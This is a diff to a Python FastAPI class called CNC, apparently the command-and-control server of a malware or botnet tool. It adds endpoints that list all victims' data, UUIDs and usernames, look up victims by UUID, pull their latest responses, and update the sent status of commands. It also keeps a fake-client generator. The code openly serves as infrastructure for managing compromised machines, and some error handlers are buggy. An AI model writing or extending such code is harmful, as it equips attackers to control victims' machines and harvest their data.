@@ -82,7 +82,7 @@ class CNC:
                 self.Database.update_latest_path(id,str(path))
                 return {"Status":True,"path":path}
             except:
-                return {"Status":False}
+                return {"Status":False,"path":None}
 
         
         @self.api.post("/api/client/response/text", status_code=200)
@@ -93,7 +93,69 @@ class CNC:
             except Exception as e:
                 logger.error(str(e))
                 return {"Status": False}
+        
+        @self.api.get("/api/cnc/getallvictimsdata",status_code=200)
+        def get_all_victims():
+            try:
+                data = self.Database.return_all_victims_data()
+                return {"Status":True,"data":data}
+                
+            except:
+                return {"Status":False,"data":None}
+            
+        @self.api.get("/api/cnc/getalluuids",status_code=200)
+        def get_all_uuids():
+            try:
+                data = self.Database._return_all_uuids()
+                return {"Status":True,"data":data}
+                
+            except:
+                return {"Status":False,"data":None}
 
+        
+        @self.api.get("/api/cnc/getallusernames",status_code=200)
+        def get_all_usernames():
+            try:
+                data = self.Database.return_all_victims_names()
+                return {"Status":True,"data":data}
+                
+            except:
+                return {"Status":False,"data":None}
+                
+        @self.api.get("/api/cnc/uuidtoname/{uuid}",status_code=200)
+        def uuid_to_name(uuid:str):
+            try:
+                name = self.Database.uuid_to_name(str(uuid))
+                return {"Status":True,"data":name}
+            except:
+                return {"Status":False,"data":name}
+        
+        @self.api.get("/api/cnc/uuidtoid/{uuid}",status_code=200)
+        def uuid_to_id(uuid:str):
+            try:
+                id = self.Database.uuid_to_id(uuid=uuid)
+                return {"Status":True,"data":id}
+            except:
+                return {"Status":True,"data":None}
+
+        @self.api.get("/api/cnc/latest_response/{id}/{time}",status_code=200)
+        def latest_response(id:int,time:int):
+            try:
+                latest_response = self.Database.get_latest_responses(id=id,time=time)
+                return {"Status":True,"data":latest_response}
+            except:
+                return{"Status":False,"data":None}
+        
+        @self.api.get("/api/cnc/changesentstatus/{status}/{responsetime}/{table}")
+        def change_sent_status(status:int,responsetime:str,table:str):
+            try:
+                self.Database.change_sent_status(status=status,response_time=responsetime,table=table)
+                return {"Status":True}
+            except:
+                return {"Status":False}
+            
+
+            
     def _GENERATE_FAKE_CLIENTS(self):
         latitude = fake.latitude()
         longitude = fake.longitude()
@@ -106,7 +168,7 @@ class CNC:
             country=fake.country(),
             location=location,
         )
-
+    
     def generate_fake_clients(self, count: int = 10):
         for i in range(count):
             self.Database.new_client(self._GENERATE_FAKE_CLIENTS())
